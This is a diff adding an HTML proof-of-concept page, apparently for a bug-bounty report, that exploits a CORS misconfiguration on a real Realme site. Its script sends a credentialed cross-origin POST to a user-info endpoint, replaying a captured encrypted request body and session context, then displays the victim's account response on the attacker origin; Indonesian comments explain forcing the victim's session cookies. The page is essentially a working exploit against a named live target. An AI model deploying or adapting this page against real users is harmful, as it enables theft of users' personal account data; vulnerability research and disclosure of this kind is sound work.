@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CORS Misconfiguration PoC - id-sg.realme.com</title>
+    <style>
+      body {
+        font-family: monospace;
+        background: #111;
+        color: #0f0;
+        padding: 20px;
+      }
+      h3 {
+        color: #fff;
+      }
+      pre {
+        background: #000;
+        padding: 15px;
+        border: 1px solid #0f0;
+        white-space: pre-wrap;
+        word-break: break-all;
+      }
+      button {
+        padding: 8px 16px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <h3>CORS Misconfiguration PoC — POST /uc/web/v1/user-info/query-basic</h3>
+    <p>
+      Target: <code>https://id-sg.realme.com</code> &nbsp;|&nbsp; Attacker
+      origin: <code>https://ikur007.github.io</code>
+    </p>
+    <button onclick="exploit()">Jalankan PoC</button>
+    <pre id="output">Klik tombol di atas untuk menjalankan request...</pre>
+
+    <script>
+      async function exploit() {
+        const output = document.getElementById("output");
+        output.textContent =
+          "Mengirim request cross-origin dengan credentials...";
+
+        try {
+          const res = await fetch(
+            "https://id-sg.realme.com/uc/web/v1/user-info/query-basic",
+            {
+              method: "POST",
+              credentials: "include", // wajib: memaksa browser kirim cookie sesi korban
+              headers: {
+                "Content-Type": "application/json;charset=UTF-8",
+                "X-Hackerone-Research": "HackerOne-ikur007",
+                // Catatan: header custom lain (X-Sign, X-App-Deviceid, dll) di request asli
+                // adalah signature/anti-tamper buatan client-side JS realme, BUKAN bagian
+                // proteksi CORS. Untuk PoC minimal, cukup buktikan response-nya bisa terbaca
+                // lintas origin — tidak wajib meniru semua header itu.
+              },
+              // Body asli hasil capture Burp lo — ini payload envelope-encrypted (X-Envelope-Version: V1),
+              // bukan JSON biasa. Dikirim apa adanya (replay) karena kita tidak perlu tahu isinya untuk
+              // membuktikan CORS misconfig; kita cuma perlu server menerimanya & browser attacker bisa
+              // baca response-nya.
+              // CATATAN: request ini terikat X-Sign + waktu capture (X-Requesttime) dan cookie sesi
+              // acIdAuthSession lo saat itu. Kalau server validasi freshness/signature ketat, replay
+              // bisa gagal (misal error signature/timestamp) walau CORS-nya tetap kebukti reflect origin
+              // dari response header OPTIONS/actual request-nya. Kalau gagal, cukup screenshot response
+              // header ACAO+ACAC yang reflect origin attacker sebagai bukti primer.
+              body: '"H1ON8P/Uqk8Oh016MPsESLO95VPD3r036Cjr0l6T48g+jKKAWWhShjbbWbE11hnjuYS5ned88WXFB999041FKrOjvHc8dy6h/JzU7LjTQmbSW6pPvkdPgoamAXu+lQGLMiG8Dr8VP6EtvwcJFlti5f+v+wCa9UbXLSwlh3dkLRA=.bt7gd4/oE43AB6EXrj9Zxl U0etM/kMpXDYGLHQjQn/US+2uR5TP6AaEHuFUTjo+Bs1fsbFZRsnG3i7ifEp2yA76vwPJc9vCGBKWKeKR++pt6u9/GFMopLTg9aYUXc2vfHo4P43w35xiNDce3zidYWCadA7QKjG+abPE4r8Tlah8=.MFg="',
+            },
+          );
+
+          const status = res.status;
+          const data = await res.text();
+
+          output.textContent =
+            "HTTP Status: " +
+            status +
+            "\n\n" +
+            "Response berhasil dibaca dari origin lain (ikur007.github.io):\n\n" +
+            data;
+        } catch (err) {
+          output.textContent = "Request gagal / diblokir browser: " + err;
+        }
+      }
+    </script>
+  </body>
+</html>
